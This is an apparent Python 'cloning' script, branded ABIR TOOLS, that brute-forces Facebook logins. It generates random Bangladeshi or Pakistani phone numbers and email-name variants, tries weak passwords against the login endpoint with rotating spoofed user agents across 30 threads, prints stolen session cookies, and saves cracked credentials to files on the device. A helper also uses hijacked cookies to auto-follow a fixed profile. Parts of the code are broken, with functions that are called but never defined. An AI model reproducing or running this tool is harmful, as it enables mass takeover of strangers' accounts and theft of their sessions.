#-----------------[ IMPORT-MODULE ]-------------------
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()




from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass


#---------------------------------MAIN>MENU---------------------------------#
import os
import os
import sys
import time
import requests
import uuid
os.system('git pull')

def o():
    os.system('clear')
    print(logo)
    print("\033[38;5;46m[1]\033[1;92m FILE CLONE")
    print("\033[38;5;46m[2]\033[1;92m RANDOM NUMBER CLONE")
    print("\033[38;5;46m[3]\033[1;92m BD NUMBER CLONE")
    print("\033[38;5;46m[4]\033[1;92m EMAIL CLONE")
    print("\033[1;91m[0]\033[1;91m EXIT")
    ABIR =input("\033[1;92m[\033[1;34m➢]\033[1;92mCHOOSE : ")
    if ABIR == '1':
    	C1()
    if ABIR == '2':
        C2()
    if ABIR == '3':
    	C3()
    if ABIR == '4':
    	C4()
    if ABIR == '5':
    	C5()
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

#------------------APK<>CHECKER-------------------#    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'%s{P}[%s×%s] %sSorry there is no Active  Apk%s         '%(N,M,N,B,N))
    else:
        print(f'[🔥] %s ☆ Your Active Apps ☆     :{B}'%(GREEN))
        for i in range(len(game)):
            print(f"[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'%s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,B,N,M,N))
    else:
        print(f'[✔] %s ☑ Your Expired Apps ☑    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"[%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f"\x1b[1;94mＢ\x1b[1;92m************************\033[1;92m X\033[1;93m－\033[1;94mM\033[1;95mA\033[1;96mF\033[1;95mI\033[1;94mY\033[1;96mA\x1b[\033[38;5;46m ************************\x1b[1;91m ●   ")
            
            



 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
 


ok = []
cp = []
id = []
ugen=[]
for xd in range(1000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

for xd in range(100):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku2)

for xd in range(1000):
    a='Redmi'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)

class ABIR:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0000)
            

#-------------------COLOR----------------#
RED = '\x1b[38;5;208m'
WHITE = '\033[1;92m'
GREEN = '\033[\033[1;92m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[38;5;46m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]

gg = random.choice(my_color)
bi = random.choice([P,M,K,B,U,O,N,H])
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()


#ugen2=[]
#ugen = ['Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) WebKit/8614 (KHTML, like Gecko) Mobile/20A380 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B82 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1;FBSS/3;FBID/phone;FBLC/zh_CN;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A392 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B82 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1;FBSS/3;FBID/phone;FBLC/en_Qaau_GB;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B110 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBID/phone;FBLC/de_DE;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B110 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1.2;FBSS/3;FBID/phone;FBLC/en_Qaau_US;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B82 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1;FBSS/3;FBID/phone;FBLC/de_DE;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B110 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A392 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0.3;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B110 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5','Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B110 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1.2;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5','Mozilla/5.0 (Linux; Android 13; CPH2411 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;','Mozilla/5.0 (Linux; Android 13; CPH2411 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;','Mozilla/5.0 (Linux; Android 13; CPH2411 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;','Mozilla/5.0 (Linux; Android 13; CPH2411 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;','Mozilla/5.0 (Linux; Android 13; CPH2411 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;','Mozilla/5.0 (Linux; Android 13; CPH2411 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.35.106;','Mozilla/5.0 (Linux; Android 12; CPH2411 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;','Mozilla/5.0 (Linux; Android 12; CPH2411 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;','Mozilla/5.0 (Linux; Android 12; CPH2411 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/389.0.0.42.111;','Mozilla/5.0 (Linux; Android 12; CPH2411 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/386.0.0.35.108;','Mozilla/5.0 (Linux; Android 12; CPH2411 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;','Mozilla/5.0 (Linux; Android 12; CPH2411 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/388.0.0.32.105;','Mozilla/5.0 (Linux; Android 12; CPH2411 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114;','Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;','Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;','Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;','Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;','Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;','Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.0.0.32.108;','Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;','Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.35.106;','Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;','Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;','Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;','Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/332.0.0.22.108;','Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;','Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;']



os.system('clear')
print('\x1b[1;32m             BANGLADESH CLONING START PLEASE WAIT  \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●')
time.sleep(5)
os.system('clear')


#-------------------mylover-------------------#
logo=f"""
\033[1;92m
  .d8b.  .88b  d88.   d8888b.  .d8b.   .o88b. db   dD 
 d8' `8b 88'YbdP`88   88  `8D d8' `8b d8P  Y8 88 ,8P' 
 88ooo88 88  88  88   88oooY' 88ooo88 8P      88,8P   
 88~~~88 88  88  88   88~~~b. 88~~~88 8b      88`8b   
 88   88 88  88  88   88   8D 88   88 Y8b  d8 88 `88. 
 YP   YP YP  YP  YP   Y8888P' YP   YP  `Y88P' YP   YD 
                                                      
                                                      


\033[1;91m\033[1;41m\033[1;97m              WELCOME TO ABIR TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM
\033[1;32m[-] VERSION   :\033[1;32m 3.0
\033[1;32m[-] AUTHOR    :\033[1;32m SADMAN ABIR SNIGDHO 
\033[1;32m[-] GITHUB    :\033[1;32m ABIR-CYBER-143
\033[1;32m[-] FACEBOOK  :\033[1;32m SNIGDHO AFRIDI
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS ABIR BRAND\033[;0m\033[1;91m═══>\033[1;92m """


try:
    print("\033[\033[1;92m\nTOOL UPDATE SUCCESSFUL\n")
    time.sleep(2)
    o()
    print("\033[1;91m\nYOUR DEVICE IS NOT SUPPORTED!\n")
    o()
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mPROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN\033[0;92m')

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions


				
				



def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
lin= 40* '-'

loop = 0
oks = []
cps = []

		
def C2():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print("\033[38;5;46mWHAT IS YOUR NAME?")
    name=input("\033[1;92mUSER NAME : \033[1;92m")
    os.system("clear")
    print(logo)
    print('ENTER YOUR COUNTRY CODE')
    print('[BD CODE] \033[38;5;46m> \033[1;92m017 - 019 - 018 - 015')
    print('[PK CODE]\033[38;5;46m> \033[1;92m+92300 - +92301 - +92304 - +92305')
    code = input('\033[1;92mCHOOSE YOUR COUNTRY CODE : ')
    os.system('clear')
    print(logo)
    limit = int(input('\033[38;5;46m[●]EXAMPLE: 3000, 5000, 15000, 20000\n\033[1;92mCHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as ABIR:
        clear()
        tl = str(len(user))
        print(f"\033[38;5;46m[●\033[\033[38;5;46m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
        print(f"\033[38;5;46m[●\033[\033[38;5;46m]\033[0;92mAGENTS         \033[1;34m: \033[0;34m"+str(len(ugen)))
        print(f"\033[38;5;46m[●\033[\033[38;5;46m]\033[0;92mCRACK ID       \033[1;34m: \033[0;97m"+tl+" ")
        print(f"\033[38;5;46m[●\033[\033[38;5;46m]\033[0;92mSIM CODE       \033[1;34m: \033[0;97m"+code)
        print(f"\x1b[1;94m.......................................................................")
        print ('')
        for love  in user:
            pwx = [love ,love [2:],love [1:],code+love ,code+love [:4],'bangladesh','khan123','freefire']
            uid = code+love 
            ABIR.submit(rcrack1,uid,pwx,tl)
    print(' CRACK PROCESS HAS BEEN COMPLETED ')
    
def ooo(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents 
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            bi = random.choice([P,M,K,B,U,O,N,H])
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
              "method": 'GET',
              "scheme": 'https',
              'path': '/login/?li=oWQVZEgITQofcB9-LVvtuWup&e=1348029&shbl=1&refsrc=deprecated&_rdr',
              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
              'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
              'cache-control': 'max-age=0',
              'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="112", "Microsoft Edge";v="112"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-platform': '"Windows"',
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'none',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1',
              'user-agent': pro}
            lo = session.post('https://x.facebook.com/login/?li=oWQVZEgITQofcB9-LVvtuWup&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;96m[\033[1;92m[ABIR-OK]\033[1;96m[💚]\033[1;92m' +cid+'\033[1;92m●'+ps+'\033[1;94m<=>'+tahunng(cid))
                print ('\033[1;32m[‎🐸]\033[1;91m = \033[1;92m'+coki+ '')
                print ('\033[1;32m[‎💚]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
                cek_apk(session,coki)
                open('/sdcard/ABIR-GMAIL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break 
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                ##print('\033[1;96m[ABIR.CP]\033[1;93m[😪]\033[1;96m'+cid+'='+ps+'\033[1;93m<=>'+tahunng(cid))
                print ('\033[1;32m[‎🍁]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
                open('/sdcard/ABIR-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(uid)
                break          
            else:
                continue
        sys.stdout.write('\r%s[ABIR-%s/%s] \033[1;92m[OK-%s][CP-%s]\r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 


def C4():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]TERGET FARST NAME: ')
    kodex = input('\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]TERGET LAST NAME :  ')
    print('\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]example Doamin :\033[1;93m@gmail.com,\033[1;96m@yahoo.com ')
    doamin = input('\033[1;96m[\033[1;93m📧\033[1;96m]\033[1;94mINPUT DOMING : ')
    limit = int(input('\033[1;92m[✔]EXAMPLE: 3000, 5000, 15000, 20000\n\033[1;92mCHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]\033[1;92mTOTAL IDS:\033[1;92m '+tl)
       # print(f"[\033[1;92m\033[1;34m✔\033[1;92m]\033[1;92mTarget Doamin:\033[1;92m {doamin}")
        print('[\033[1;92m\033[1;34m✔\033[1;92m]\033[1;92mTHE PROCESS HAS BEEN STARTED ')
        print('[\033[1;92m\033[1;34m✔\033[1;92m]\033[1;92mUSE AROPELEN MOD ON OF FOR OK IDS ')
